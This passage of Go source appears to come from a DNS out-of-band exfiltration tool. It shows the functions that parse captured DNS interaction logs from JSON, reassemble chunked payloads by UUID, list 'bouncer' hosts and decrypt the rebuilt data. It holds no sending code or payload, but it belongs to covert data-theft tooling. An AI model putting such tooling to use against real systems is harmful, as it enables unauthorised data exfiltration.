			payloads, err = ParseJSONData(OOBSettings.JSONFile, Exfiltrator.UUID)
			outfile = "output.bin"
			newlines = false
		} else {
			payloads, err = ExtractBounceableHosts(OOBSettings.JSONFile)
			outfile = GeneralSettings.BouncersFile
			newlines = true
		}
		if err != nil {
			os.Exit(JSONReadError)
		}

		// Write output to intermediate encrypted file
		WriteDataToFile(&payloads, outfile, newlines)

		// Decrypt file if required
		if GeneralSettings.Task == DNSExtractDecrypt {
			DecryptFile(Exfiltrator.CryptFile, Exfiltrator.OutputFile, []byte(CryptoSettings.Key))
		}

	} else {
		fmt.Println("Unable to extract data - no JSON input file specified.")
		os.Exit(JSONReadError)
	} // End if OOBSettings.JSONFile
}

// Extract data from DNS JSON file (and decrypt if required)
func extractDecryptDnsJson() {

	// Extract data from JSON file and output to rebuilt encrypted file
	if OOBSettings.JSONFile != "" {

		// Get payloads from file
		payloads, err := ParseJSONData(OOBSettings.JSONFile, Exfiltrator.UUID)
		if err != nil {
			os.Exit(JSONReadError)
		}

		// Concatenate the strings together (empty separator as we're just truning sring array into single string)
		encryptedData := strings.Join(payloads[:], "")

		// Decrypt payloads, write to output file
		DecryptByteArray([]byte(encryptedData), Exfiltrator.OutputFile, []byte(CryptoSettings.Key))

	} else {
		fmt.Println("Unable to extract data - no JSON input file specified.")
		os.Exit(JSONReadError)
	} // End if OOBSettings.JSONFile
}
